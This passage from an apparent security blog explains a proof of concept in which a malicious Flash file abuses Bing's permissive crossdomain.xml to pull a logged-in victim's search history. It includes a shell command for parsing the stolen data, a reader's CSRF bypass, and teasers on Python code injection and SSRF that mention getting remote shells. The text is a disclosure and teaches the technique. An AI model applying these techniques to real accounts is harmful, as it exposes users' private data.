root@kali:/var/www# cat /tmp/bing.txt | xmllint --format - | grep "sh\_item\_cl\_url"

![](https://lh5.googleusercontent.com/X0K0ZkTfZfaILS35kvd6FDhxh3UbcY9TdnEeBatkfz_cmqM-uvBhTGQGxdoSkSd2kUs9IhClBaCS8AQuaogwy5LEuFnKScDvq9pAXgSABnULnf59os1ZlsiaLIGnpqyBqFINmWWPLUo)

This is where I stopped, but the POC can be extended to include the users entire search history, by using the <https://www.bing.com/profile/history/more> page. In the screenshot below, the t parameter is a timestamp that can be iterated. You can see that by modifying the timestamp, I was able to pull up things I searched for back in December 2012:

![](https://lh6.googleusercontent.com/-JRKoTbMaT7F7jKmV4nmTXo2QikI8xhhhOBtclRdDzFXiNxBjdHdHN22S9zU-C0sTnJ0RuqRBPMxMWD_hpQSplV_5VnVWFjv291GuLRaRn4zcKDHKgOohtB8EFqpeF4LXFztJngf7sc)

The malicious SWF could have easily made multiple requests, walking back the timestamp each time, essentially downloading everything the victim has ever searched for on Bing.com.

Here is the ActionScript source (BingExternal.as), that once compiled, becomes BingExternal.SWF:

![](https://lh6.googleusercontent.com/WglhVj3lqEBoaxv05r0KRZ6bv9r8eLT5FUdnL6hDWm7Bd-6QFXeSi0evQILaD6F4E0r8Vf3QZ0dMM6TYhf1RuvMveckVjsz-EZmq_6ZP-6u_qA-XJ6j74BwMXetL_j9e61DLX7kpyYA)

If you look closely at the very first picture in the POC, you will notice that victim was viewing https://ssl.bing.com/profile/history. You should also notice that the exploit SWF requests the sensitive data from https://www.bing.com/profile/history. This is where I got lucky.

I \*think\* the developers made the following assumption:

* When a user is authenticated, we send them to ssl.bing.com, and that crossdomain.xml does not exist, so all is good.
* When a user is unauthenticated, we send them to [www.bing.com](http://www.bing.com/). Even though we have a very permissive crossdomain.xml, only unauthenticated users will use this part of the site, so no sensitive information can be stolen via Flash.

So really, I was only able to really exploit the overly permissive crossdomain.xml file and gain access to the sensitive information because the application sent the sensitive history information to authenticated users, even when they requested the data from [www.bing.com/profile/history](http://www.bing.com/profile/history).  If Bing told authenticated users to use ssl.bing.com/profile/history or get lost, I would not have had a very exciting demo.

Great job on the PoC and the clear explanation. You did get lucky indeed with the same information available over www.bing.com domain.

I have recently exploited a CSRF which was based on the similar developer thought-process.

They were preventing/blocking CSRF attacks from POST requests by doing a strict Referer checking but when that POST is changed to GET and the variables passed in the query string, VOILA! I was able to perform the same operation.

This mindset just shows how prevention/mitigation of an attack should not be done by something like a blacklist or in other words blocking a particular case. Things are circumvented almost all the time.

Cheers for a great read :)

I did a survey of the top 1 million sites to see just how many were vulnerable to this sort of attack and published the results:

A web application vulnerable to Python code injection allows you to send Python code though the application to the Python interpreter on the target server. If you can execute python, you can likely call operating system commands. If you can run operating system commands, you can read/write files that you have access to, and potentially even launch a remote interactive shell (e.g., nc, Metasploit, Empire). The thing is, when I needed to exploit this on an external penetration test recently, I had a hard time finding information online about how to move from proof of concept (POC) to useful web application exploitation. Together with my colleague Charlie Worrell ( @decidedlygray ),  we were able to turn the Burp POC (sleep for 20 seconds) into a non interactive shell, which is what this post covers. Python code injection is a subset of server-side code injection, as this vulnerability can occur in many other languages (e.g., Perl and Ruby). In fact, for those of you who are CWE f...

I recently came across a Server Side Request Forgery (SSRF) vulnerability within an application that I assessed.  The application was hosted on Amazon EC2 and was using Node.js, Express.js, and as I found out later, Needle.js. Discovery   Manual Discovery In the discovery phase, I noticed a function of the application that was taking a user specified URL and displaying the first paragraph from that URL into the page.  This application allowed a user to share a URL with their friends, and grabbing the first paragraph was a feature that would provide the friends with more context. The thing is, when looking at my Burp history, I could not find the request to the URL that I specified in my logs.  This should raise an eyebrow!   This means that the server is taking the URL I specified, making a request on my behalf, and then returning the result to me. That right there is SSRF .  Then, the only question was: What is the risk? Automated Discover...
